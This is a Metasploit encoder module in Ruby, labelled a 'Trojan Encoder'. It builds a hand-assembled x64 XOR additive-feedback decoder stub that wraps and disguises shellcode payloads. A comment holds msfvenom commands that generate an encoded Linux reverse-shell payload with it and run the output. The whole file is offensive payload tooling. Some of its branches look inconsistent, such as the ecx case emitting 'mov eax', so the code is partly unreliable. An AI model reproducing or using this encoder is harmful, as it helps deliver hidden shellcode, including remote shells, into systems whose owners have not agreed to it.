##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder::XorAdditiveFeedback
  # this metasploit module inherits Msf > Encoder > Xor properties
  # Rank = ExcellentRanking
  def initialize
    super(
    'Name'             => 'xaf v1.0.0 (11/21/2017) [github.com/Radicalware] Trojan Encoder',
    'Description'      => 'xaf v1.0.0 (11/21/2017) [github.com/Radicalware] Trojan Encoder
Lightweight Xor XorAdditive Feedback Encoder for 64bit
    ',
    'Author'           => [ 'Scourge' ],
    'Arch'             => ARCH_X64,
    'License'          => MSF_LICENSE,
    'Decoder'          =>
      {
        'KeySize'      => 8,
        'KeyPack'      => 'Q',
        'BlockSize'    => 8,
      }
    )
  end

  def can_preserve_registers?
    false
  end

  def decoder_stub( state, opts={} )
    op1 = (datastore['op1'] || '') 
    op2 = (datastore['op2'] || '') 

    $ac = arch.join('')
    require 'metasm'


    state.buf += "\x00"
    block_count = [-( ( (state.buf.length - 1) / state.decoder_key_size) + 1)].pack( "V" )

    state_buf_len = state.buf.length

    inc_for_even_zero = 0
    decrease_count_be = (state_buf_len.to_i / 8 + 1)
    if (state_buf_len.to_i % 8) != 0
      decrease_count_be += 1
      inc_for_even_zero = 1
    end

    leng_of_dec_hex = decrease_count_be.to_s(16)
    if leng_of_dec_hex.length%2 != 0
      leng_of_dec_hex = '0'+leng_of_dec_hex
    end
    bytes_of_dec_hex_leng = leng_of_dec_hex.length/2

    dec_count = '0x'+decrease_count_be.to_s(16)   


=begin 

msfvenom -p linux/x64/rshell -b '\x00\x2f' --platform linux -a x86_64 -e x64/light -f c 

msfvenom -p linux/x64/e254 --platform linux -a x86_64 -f c -e x64/light -b '\x00\x0a' | Rmutate -s -pp -bc -linux -df ./test test && ./test/shellcode-test

https://ruby-doc.org/core-2.3.0/String.html#method-i-unpack

=end



    def con(optc)
      if $ac != 'x64'
        Metasm::Shellcode.assemble(Metasm::Ia32.new, optc).encode_string
      else
        Metasm::Shellcode.assemble(Metasm::X64.new, optc).encode_string
      end
    end
    
    over = true
    if bytes_of_dec_hex_leng > 4   # so 5 - 8 = rcx
      mv_rcx = con("mov rcx, #{dec_count}")
      over = true
    elsif bytes_of_dec_hex_leng > 2 # so 3 or 4 = ecx
      mv_rcx = con("mov eax, #{dec_count}")
    elsif bytes_of_dec_hex_leng > 1 # so 2 = cx
      mv_rcx = con("mov cx, #{dec_count}")
    else # small shellcode
      mv_rcx = con("mov cl, #{dec_count}")
      over = false
    end

    dec_rcx = con('dec rcx')

    junk = "" # POC put a random junk hex here if you want. (note: This won't actually get you past AV)

    #||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
    #|-------------------------------------------------------------------------------------------------
    decode_prep =  #                            _start                                          
    #|-------------------------------------------------------------------------------------------------
       "\x48\x31\xc9"+                     #|            |  xor    rcx,rcx
       "\x51"+                             #|            |  push   rcx
       "\xeb"+"FORWARD_JMP"+               #|            |  jmp    0xeb = jmp & 1c (bigger is longer)
    #|-------------------------------------------------------------------------------------------------
    #|                                          decoder                                         
    #|-------------------------------------------------------------------------------------------------
       "\x5a"+                             #|            |  pop    rdx
       mv_rcx+                             #|            |  mov    cl,0x04  <"or">  add    rcx,0x04
       "\x48\xbb"+"PASSCODE"               #|            |  mov    rbx, (xor key)
    #|-------------------------------------------------------------------------------------------------
       decode = #                               decode                                          
    #|-------------------------------------------------------------------------------------------------
       "\x48\x31\x1a"+                     #|            |  xor    QWORD PTR [rdx],rbx  ; xor code
       "\x48\x03\x1a"+                     #|            |  add    rbx, QWORD PTR [rdx] ; update key
       "\x48\x83\xc2\x08"+                 #|            |  add    rdx,0x8              ; update loop
    #|-------------------------------------------------------------------------------------------------
    #|                                          compare                                         
    #|-------------------------------------------------------------------------------------------------
       dec_rcx+                            #|            |  dec    rcx
       "\x48\x83\xf9\x01"                  #|            |  cmp    rcx,0x1
       split_backward = "\x75"+[(255-((decode.unpack("H*").join("")).length/2)-1).to_s(16)].pack("H*")
                                           #|            |  jne    400093 <decode>
       split_forward  = "\x74"+([(junk.unpack("H*").join("").length/2+5)].pack("N*").gsub /^\000*/,'')
                                           #|            |  je     jmp 5 bytes "\xe8\xdc\xff\xff\xff"
    #|-------------------------------------------------------------------------------------------------
    #|                                       find_address                                       
    #|-------------------------------------------------------------------------------------------------
     call_code = ("\xe8"+"BACKWARD_JMP")   #|            |  call   "df ff ff ff" - 4 - fd_jmp
    #|-------------------------------------------------------------------------------------------------
    #|                                     encoded_shellcode                                    
    #|-------------------------------------------------------------------------------------------------
    #||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

    decoder = decode_prep + junk + decode  + split_backward + junk + split_forward + junk + call_code

    up_decoder = decoder.unpack('H*').join('')
    index_fd_jmp = up_decoder.index('464f52574152445f4a4d50')   # FORWARD_JMP
    index_bk_jmp = up_decoder.index('4241434b574152445f4a4d50') # BACKWARD_JMP
    jmp_d = index_bk_jmp - index_fd_jmp - '464f52574152445f4a4d50'.length 
    
    jmp_d = (jmp_d /2)-1

    first = jmp_d.to_s(16)

    bkjmp = ("\xfa\xff\xff\xff".unpack('N*').pack('V*').unpack('H*')[0].to_i(16)) - jmp_d +1
    last  = [bkjmp].pack("N*").unpack("V*")[0].to_s(16).gsub /00*$/,""


    fd_jmp = [first].pack("H*")
    bk_jmp  = [last].pack("H*")

    up_decoder.gsub! '464f52574152445f4a4d50',  first
    up_decoder.gsub! '4241434b574152445f4a4d50', last

    decoder = [up_decoder].pack("H*")

    
    state.decoder_key_offset = decoder.index('PASSCODE')

    return decoder
  end
end
